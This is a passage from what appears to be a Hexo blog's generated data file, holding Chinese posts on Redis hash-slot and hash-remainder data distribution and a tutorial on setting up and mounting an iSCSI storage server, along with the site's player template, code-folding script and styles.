fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"基本思想\"><a href=\"#基本思想\" class=\"headerlink\" title=\"基本思想\"></a>基本思想</h3><p>哈希槽(Hash Slot)算法是Redis集群实现分布式存储的核心算法。其基本思路是:</p>\n<ol>\n<li><p>将整个键空间(0-2^16-1)划分为固定数目(比如1024)的槽(slot)。 </p>\n</li>\n<li><p>根据键值的哈希值对槽数取模,计算该键应该映射到哪个槽。</p>\n</li>\n</ol>","more":"<ol start=\"3\">\n<li><p>将槽均匀分配给不同的节点。</p>\n</li>\n<li><p>节点只负责处理映射到自己槽位上的键值操作。</p>\n</li>\n</ol>\n<p>例如,节点A负责0-511槽,节点B负责512-1023槽。</p>\n<p>对键值foo计算哈希值,如果余数为100,则该键值属于第100个槽,由节点A处理。</p>\n<p>这种方式可将大量键值均匀地分布在不同节点上,实现扩展。</p>\n<p>增加节点时,可以平移部分槽到新节点,不需要重定向键值,方便扩容。</p>\n<p>相比一致性哈希,哈希槽算法实现更简单,数据分布更均匀,是Redis集群首选的分布式存储算法。</p>\n<h3 id=\"缺点\"><a href=\"#缺点\" class=\"headerlink\" title=\"缺点\"></a>缺点</h3><p>哈希槽算法虽是目前最好的解决方案，但是也并不是最完美的，主要存在一下几个缺点：</p>\n<ol>\n<li>键空间分片粒度大</li>\n</ol>\n<p>哈希槽算法将整个键空间划分为固定数目的槽,典型的槽位数是1024个。这导致单个槽所能存储的键值上限很大,分片粒度较粗。</p>\n<ol start=\"2\">\n<li>热点键问题</li>\n</ol>\n<p>由于哈希冲突,可能有大量访问热点的键值都映射到同一个槽,导致访问压力集中在单个节点。</p>\n<ol start=\"3\">\n<li>不均衡</li>\n</ol>\n<p>随着时间推移,不同槽所存储的键值数量可能出现不平衡,导致不同节点负载不均。</p>\n<ol start=\"4\">\n<li>节点扩容缩容代价大</li>\n</ol>\n<p>扩容时需要平移部分槽到新节点;缩容时需要复制槽内数据到其他节点。数据量大时代价高。</p>\n<ol start=\"5\">\n<li>只适合键值型数据库</li>\n</ol>\n<p>哈希槽算法依赖键值哈希映射,不适合用于关系型数据库等其他数据类型。</p>\n<p>总体来说,这些缺点限制了哈希槽算法在更大规模和更复杂场景下的适用性。需要与其他技术相结合来获取更好的分布式效果。</p>"},{"title":"分布式存储之哈希取余算法","date":"2023-08-13T06:28:58.000Z","_content":"\n### 基本思想\n\n哈希取余算法是一种简单的分布式存储算法,基本思想是:\n\n1. 对存储数据计算哈希值(hash)\n\n2. 对存储节点数量取余,得到一个索引值\n\n<!-- more -->\n\n3. 根据索引值将数据存储到对应的存储节点上\n\n例如,有存储数据A,B,C,总共3个存储节点(节点号0,1,2)\n\n1. 计算A的哈希值hash(A) = 7 \n\n2. 7 % 3 = 1,所以存储到节点1\n\n3. 计算B的哈希值hash(B) = 11\n\n4. 11 % 3 = 2,所以存储到节点2\n\n5. 计算C的哈希值hash(C) = 5\n\n6. 5 % 3 = 2,所以也存储到节点2\n\n通过这个算法,可以将数据均匀地分布到不同的存储节点上,实现负载均衡。\n\n这种算法的优点是简单易实现,计算速度快,缺点是扩容或节点变更时需要重定位大量数据,也无法防止数据热点问题。\n\n所以哈希取余算法适用于小规模、低变更频率的分布式存储场景。在大数据量或高变更频率场景下,会采用一致性哈希等更高效的算法。","source":"_posts/HashRemainder.md","raw":"---\ntitle: 分布式存储之哈希取余算法\ndate: 2023-08-13 14:28:58\ncategories: 理论知识\ntags:\n  - Docker\n  - Redis\n---\n\n### 基本思想\n\n哈希取余算法是一种简单的分布式存储算法,基本思想是:\n\n1. 对存储数据计算哈希值(hash)\n\n2. 对存储节点数量取余,得到一个索引值\n\n<!-- more -->\n\n3. 根据索引值将数据存储到对应的存储节点上\n\n例如,有存储数据A,B,C,总共3个存储节点(节点号0,1,2)\n\n1. 计算A的哈希值hash(A) = 7 \n\n2. 7 % 3 = 1,所以存储到节点1\n\n3. 计算B的哈希值hash(B) = 11\n\n4. 11 % 3 = 2,所以存储到节点2\n\n5. 计算C的哈希值hash(C) = 5\n\n6. 5 % 3 = 2,所以也存储到节点2\n\n通过这个算法,可以将数据均匀地分布到不同的存储节点上,实现负载均衡。\n\n这种算法的优点是简单易实现,计算速度快,缺点是扩容或节点变更时需要重定位大量数据,也无法防止数据热点问题。\n\n所以哈希取余算法适用于小规模、低变更频率的分布式存储场景。在大数据量或高变更频率场景下,会采用一致性哈希等更高效的算法。","slug":"HashRemainder","published":1,"updated":"2024-05-03T03:55:54.729Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5e3002i7zj3db5f86t7","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"基本思想\"><a href=\"#基本思想\" class=\"headerlink\" title=\"基本思想\"></a>基本思想</h3><p>哈希取余算法是一种简单的分布式存储算法,基本思想是:</p>\n<ol>\n<li><p>对存储数据计算哈希值(hash)</p>\n</li>\n<li><p>对存储节点数量取余,得到一个索引值</p>\n</li>\n</ol>\n<span id=\"more\"></span>\n\n<ol start=\"3\">\n<li>根据索引值将数据存储到对应的存储节点上</li>\n</ol>\n<p>例如,有存储数据A,B,C,总共3个存储节点(节点号0,1,2)</p>\n<ol>\n<li><p>计算A的哈希值hash(A) &#x3D; 7 </p>\n</li>\n<li><p>7 % 3 &#x3D; 1,所以存储到节点1</p>\n</li>\n<li><p>计算B的哈希值hash(B) &#x3D; 11</p>\n</li>\n<li><p>11 % 3 &#x3D; 2,所以存储到节点2</p>\n</li>\n<li><p>计算C的哈希值hash(C) &#x3D; 5</p>\n</li>\n<li><p>5 % 3 &#x3D; 2,所以也存储到节点2</p>\n</li>\n</ol>\n<p>通过这个算法,可以将数据均匀地分布到不同的存储节点上,实现负载均衡。</p>\n<p>这种算法的优点是简单易实现,计算速度快,缺点是扩容或节点变更时需要重定位大量数据,也无法防止数据热点问题。</p>\n<p>所以哈希取余算法适用于小规模、低变更频率的分布式存储场景。在大数据量或高变更频率场景下,会采用一致性哈希等更高效的算法。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"基本思想\"><a href=\"#基本思想\" class=\"headerlink\" title=\"基本思想\"></a>基本思想</h3><p>哈希取余算法是一种简单的分布式存储算法,基本思想是:</p>\n<ol>\n<li><p>对存储数据计算哈希值(hash)</p>\n</li>\n<li><p>对存储节点数量取余,得到一个索引值</p>\n</li>\n</ol>","more":"<ol start=\"3\">\n<li>根据索引值将数据存储到对应的存储节点上</li>\n</ol>\n<p>例如,有存储数据A,B,C,总共3个存储节点(节点号0,1,2)</p>\n<ol>\n<li><p>计算A的哈希值hash(A) &#x3D; 7 </p>\n</li>\n<li><p>7 % 3 &#x3D; 1,所以存储到节点1</p>\n</li>\n<li><p>计算B的哈希值hash(B) &#x3D; 11</p>\n</li>\n<li><p>11 % 3 &#x3D; 2,所以存储到节点2</p>\n</li>\n<li><p>计算C的哈希值hash(C) &#x3D; 5</p>\n</li>\n<li><p>5 % 3 &#x3D; 2,所以也存储到节点2</p>\n</li>\n</ol>\n<p>通过这个算法,可以将数据均匀地分布到不同的存储节点上,实现负载均衡。</p>\n<p>这种算法的优点是简单易实现,计算速度快,缺点是扩容或节点变更时需要重定位大量数据,也无法防止数据热点问题。</p>\n<p>所以哈希取余算法适用于小规模、低变更频率的分布式存储场景。在大数据量或高变更频率场景下,会采用一致性哈希等更高效的算法。</p>"},{"title":"搭建并挂载ISCSI存储服务器","date":"2023-07-04T07:18:06.000Z","_content":"\n### ISCSI服务器端\n\n比如现在ISCSI服务器端有两块硬盘，我们想把第二块硬盘（sdb）共享出去。\n\n1. 下载软件\n\n```bash\nyum install -y targetcli\n```\n\n2. 开始进行服务端的配置\n\n* 首先键入`targetcli`进入iscsi配置模式\n\n```bash\ntargetcli\n```\n\n<!-- more -->\n\n* 然后先创建一个后端存储\n\n```bash\ncd /backstores/block/\ncreate disk1 /dev/sdb\n```\n\n`disk1`代表起的一个名字，`/dev/sdb`是真实机器里存在的设备。\n\n* 创建可以识别的iqn设备\n\n```bash\ncd /iscsi/\ncreate iqn.2023-07.com.liuxp:san1\n```\n\n`iqn.2023-07.com.liuxp:san1`是可以被客户端的识别到的名字，客户端可以凭这个名字挂载到自身。\n\n* 创建iqn里的卷，刚刚创建的iqn只是一个名字，里面现在还没有存储设备，现在要在里面添加存储设备\n\n```bash\ncd iqn.2023-07.com.liuxp:san1/tpg1/luns/\ncreate /backstores/block/disk1\n```\n\n* 创建好iqn里的存储设备，然后就该设置iqn设备的访问权限了\n\n```bash\ncd ../acls/\ncreate iqn.2023-07.com.liuxp:web1\n```\n\n不要奇怪这个新创建的iqn是一个识别秘钥，客户端需要拿着这个秘钥来连接，以此来达到访问控制的目的。具体的操作是将这个`acls`里的`iqn`名字复制下来待会粘贴到客户端的一个配置文件里面。\n\n* 设置门户，这个我也解释不清楚含义，就是想在这里介绍一下删除命令，还有如果要设置的话，要设置为本机的IP\n\n```bash\ncd ../portals/\ndelele 0.0.0.0 3260\ncreate 10.8.7.41 3260\n```\n\n* 到这里就设置完成了键入`exit`退出设置。\n\n* 启动服务\n\n```bash\nsystemctl start target.service \n```\n\n### ISCSI客户端\n\n1. 下载软件\n\n```bash\nyum install -y iscsi-initiator-utils\n```\n\n2. 修改配置文件`/etc/iscsi/initiatorname.iscsi`\n\n```bash\nInitiatorName=iqn.2023-07.com.liuxp:web1\n```\n\n把这里的iqn设置为服务器端`acls`里的那个iqn，上面也说过一嘴。\n\n3. 然后开始扫描iqn设备\n\n```bash\niscsiadm -m discovery -t st -p 10.8.7.41\n```\n\n**p选项**后面接上服务器端的IP地址。\n\n4. 扫描到之后接着开始最后一步挂载\n\n```bash\niscsiadm -m node -T iqn.2023-07.com.liuxp:san1 -p 10.8.7.41 -l\n```\n\n**T选项**后面接上面刚刚扫描出来的iqn设备，**p选项**接ISCSI服务器的IP\n\n5. 可以通过下面的命令查看挂载成功的会话信息\n\n```bash\niscsiadm -m session\n```\n\n6. 如果需要的话可以了解一下，卸载本地已挂载的全部ISCSI存储设备\n\n```bash\niscsiadm -m node --logoutall=all\n```\n\n7. 写在最后的话\n\n如果遇到第4步无法挂载，一是要检查配置文件的iqn是否和服务器acls设置一致，二是要检查IP地址时候填写正确，客户端如果检查都无误了，因为之前会产生缓存，一般后面几次也不会成功，可以通过删除`/var/lib/iscsi/nodes`及`/var/lib/iscsi/send_targets`下的内容之后再次尝试。如果还是不行，就只能重启了。如果对服务器端进行了修改，一定要记得重启服务生效。","source":"_posts/ISCSI.md","raw":"---\ntitle: 搭建并挂载ISCSI存储服务器\ndate: 2023-07-04 15:18:06\ncategories: 技术\ntags:\n  - Linux\n---\n\n### ISCSI服务器端\n\n比如现在ISCSI服务器端有两块硬盘，我们想把第二块硬盘（sdb）共享出去。\n\n1. 下载软件\n\n```bash\nyum install -y targetcli\n```\n\n2. 开始进行服务端的配置\n\n* 首先键入`targetcli`进入iscsi配置模式\n\n```bash\ntargetcli\n```\n\n<!-- more -->\n\n* 然后先创建一个后端存储\n\n```bash\ncd /backstores/block/\ncreate disk1 /dev/sdb\n```\n\n`disk1`代表起的一个名字，`/dev/sdb`是真实机器里存在的设备。\n\n* 创建可以识别的iqn设备\n\n```bash\ncd /iscsi/\ncreate iqn.2023-07.com.liuxp:san1\n```\n\n`iqn.2023-07.com.liuxp:san1`是可以被客户端的识别到的名字，客户端可以凭这个名字挂载到自身。\n\n* 创建iqn里的卷，刚刚创建的iqn只是一个名字，里面现在还没有存储设备，现在要在里面添加存储设备\n\n```bash\ncd iqn.2023-07.com.liuxp:san1/tpg1/luns/\ncreate /backstores/block/disk1\n```\n\n* 创建好iqn里的存储设备，然后就该设置iqn设备的访问权限了\n\n```bash\ncd ../acls/\ncreate iqn.2023-07.com.liuxp:web1\n```\n\n不要奇怪这个新创建的iqn是一个识别秘钥，客户端需要拿着这个秘钥来连接，以此来达到访问控制的目的。具体的操作是将这个`acls`里的`iqn`名字复制下来待会粘贴到客户端的一个配置文件里面。\n\n* 设置门户，这个我也解释不清楚含义，就是想在这里介绍一下删除命令，还有如果要设置的话，要设置为本机的IP\n\n```bash\ncd ../portals/\ndelele 0.0.0.0 3260\ncreate 10.8.7.41 3260\n```\n\n* 到这里就设置完成了键入`exit`退出设置。\n\n* 启动服务\n\n```bash\nsystemctl start target.service \n```\n\n### ISCSI客户端\n\n1. 下载软件\n\n```bash\nyum install -y iscsi-initiator-utils\n```\n\n2. 修改配置文件`/etc/iscsi/initiatorname.iscsi`\n\n```bash\nInitiatorName=iqn.2023-07.com.liuxp:web1\n```\n\n把这里的iqn设置为服务器端`acls`里的那个iqn，上面也说过一嘴。\n\n3. 然后开始扫描iqn设备\n\n```bash\niscsiadm -m discovery -t st -p 10.8.7.41\n```\n\n**p选项**后面接上服务器端的IP地址。\n\n4. 扫描到之后接着开始最后一步挂载\n\n```bash\niscsiadm -m node -T iqn.2023-07.com.liuxp:san1 -p 10.8.7.41 -l\n```\n\n**T选项**后面接上面刚刚扫描出来的iqn设备，**p选项**接ISCSI服务器的IP\n\n5. 可以通过下面的命令查看挂载成功的会话信息\n\n```bash\niscsiadm -m session\n```\n\n6. 如果需要的话可以了解一下，卸载本地已挂载的全部ISCSI存储设备\n\n```bash\niscsiadm -m node --logoutall=all\n```\n\n7. 写在最后的话\n\n如果遇到第4步无法挂载，一是要检查配置文件的iqn是否和服务器acls设置一致，二是要检查IP地址时候填写正确，客户端如果检查都无误了，因为之前会产生缓存，一般后面几次也不会成功，可以通过删除`/var/lib/iscsi/nodes`及`/var/lib/iscsi/send_targets`下的内容之后再次尝试。如果还是不行，就只能重启了。如果对服务器端进行了修改，一定要记得重启服务生效。","slug":"ISCSI","published":1,"updated":"2024-05-03T03:55:54.729Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5e5002m7zj3g8mb8f7h","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"ISCSI服务器端\"><a href=\"#ISCSI服务器端\" class=\"headerlink\" title=\"ISCSI服务器端\"></a>ISCSI服务器端</h3><p>比如现在ISCSI服务器端有两块硬盘，我们想把第二块硬盘（sdb）共享出去。</p>\n<ol>\n<li>下载软件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y targetcli</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>开始进行服务端的配置</li>\n</ol>\n<ul>\n<li>首先键入<code>targetcli</code>进入iscsi配置模式</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">targetcli</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<ul>\n<li>然后先创建一个后端存储</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /backstores/block/</span><br><span class=\"line\">create disk1 /dev/sdb</span><br></pre></td></tr></table></figure>\n\n<p><code>disk1</code>代表起的一个名字，<code>/dev/sdb</code>是真实机器里存在的设备。</p>\n<ul>\n<li>创建可以识别的iqn设备</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /iscsi/</span><br><span class=\"line\">create iqn.2023-07.com.liuxp:san1</span><br></pre></td></tr></table></figure>\n\n<p><code>iqn.2023-07.com.liuxp:san1</code>是可以被客户端的识别到的名字，客户端可以凭这个名字挂载到自身。</p>\n<ul>\n<li>创建iqn里的卷，刚刚创建的iqn只是一个名字，里面现在还没有存储设备，现在要在里面添加存储设备</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> iqn.2023-07.com.liuxp:san1/tpg1/luns/</span><br><span class=\"line\">create /backstores/block/disk1</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>创建好iqn里的存储设备，然后就该设置iqn设备的访问权限了</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> ../acls/</span><br><span class=\"line\">create iqn.2023-07.com.liuxp:web1</span><br></pre></td></tr></table></figure>\n\n<p>不要奇怪这个新创建的iqn是一个识别秘钥，客户端需要拿着这个秘钥来连接，以此来达到访问控制的目的。具体的操作是将这个<code>acls</code>里的<code>iqn</code>名字复制下来待会粘贴到客户端的一个配置文件里面。</p>\n<ul>\n<li>设置门户，这个我也解释不清楚含义，就是想在这里介绍一下删除命令，还有如果要设置的话，要设置为本机的IP</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> ../portals/</span><br><span class=\"line\">delele 0.0.0.0 3260</span><br><span class=\"line\">create 10.8.7.41 3260</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>到这里就设置完成了键入<code>exit</code>退出设置。</p>\n</li>\n<li><p>启动服务</p>\n</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl start target.service </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ISCSI客户端\"><a href=\"#ISCSI客户端\" class=\"headerlink\" title=\"ISCSI客户端\"></a>ISCSI客户端</h3><ol>\n<li>下载软件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y iscsi-initiator-utils</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>修改配置文件<code>/etc/iscsi/initiatorname.iscsi</code></li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">InitiatorName=iqn.2023-07.com.liuxp:web1</span><br></pre></td></tr></table></figure>\n\n<p>把这里的iqn设置为服务器端<code>acls</code>里的那个iqn，上面也说过一嘴。</p>\n<ol start=\"3\">\n<li>然后开始扫描iqn设备</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iscsiadm -m discovery -t st -p 10.8.7.41</span><br></pre></td></tr></table></figure>\n\n<p><strong>p选项</strong>后面接上服务器端的IP地址。</p>\n<ol start=\"4\">\n<li>扫描到之后接着开始最后一步挂载</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iscsiadm -m node -T iqn.2023-07.com.liuxp:san1 -p 10.8.7.41 -l</span><br></pre></td></tr></table></figure>\n\n<p><strong>T选项</strong>后面接上面刚刚扫描出来的iqn设备，<strong>p选项</strong>接ISCSI服务器的IP</p>\n<ol start=\"5\">\n<li>可以通过下面的命令查看挂载成功的会话信息</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iscsiadm -m session</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>如果需要的话可以了解一下，卸载本地已挂载的全部ISCSI存储设备</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iscsiadm -m node --logoutall=all</span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li>写在最后的话</li>\n</ol>\n<p>如果遇到第4步无法挂载，一是要检查配置文件的iqn是否和服务器acls设置一致，二是要检查IP地址时候填写正确，客户端如果检查都无误了，因为之前会产生缓存，一般后面几次也不会成功，可以通过删除<code>/var/lib/iscsi/nodes</code>及<code>/var/lib/iscsi/send_targets</code>下的内容之后再次尝试。如果还是不行，就只能重启了。如果对服务器端进行了修改，一定要记得重启服务生效。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 